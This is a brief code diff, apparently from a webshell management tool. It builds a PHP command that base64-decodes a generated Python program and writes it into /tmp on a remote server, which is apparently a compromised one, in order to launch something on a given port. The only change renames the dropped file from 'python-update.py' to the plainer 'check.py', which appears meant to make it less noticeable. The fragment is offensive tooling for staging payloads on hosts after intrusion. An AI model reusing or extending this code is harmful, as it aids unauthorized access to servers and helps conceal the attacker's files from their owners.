@@ -104,7 +104,7 @@ def run(port: int = 8888):
     flag = has_env("python")
     if flag:
         python = get_python(port)
-        pyname = "python-update.py"
+        pyname = "check.py"
         text = send(
             f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{b64encode(python.encode()).decode()}\")));"
         ).r_text.strip()
